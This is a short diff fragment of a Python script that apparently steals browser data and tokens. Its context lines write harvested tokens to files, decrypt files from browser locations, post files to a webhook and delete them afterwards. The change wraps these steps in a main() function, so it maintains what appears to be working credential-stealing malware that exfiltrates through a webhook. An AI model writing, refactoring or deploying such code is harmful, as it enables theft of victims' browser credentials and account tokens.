@@ -218,7 +218,6 @@ def main_tokens():
             for i in tokens:
                 f.write(str(i) + "\n")
             f.close()
-main_tokens()
 
 
 def decrypt_files(path, browser):
@@ -230,8 +229,7 @@ def decrypt_files(path, browser):
         f.write(browser + " not installed\n")
         f.close()
         
-for name, path in browser_loc.items():
-       decrypt_files(path, name) 
+
 
 
 ###WEBHOOK
@@ -272,7 +270,12 @@ def fileHandler(file):
             post_to(file)
         os.remove(file)
 
-for i in forHandler:
-    fileHandler(i)
+def main():
+    for name, path in browser_loc.items():
+           decrypt_files(path, name) 
+    main_tokens()
+    for i in forHandler:
+        fileHandler(i)
+main()
 
 ###end
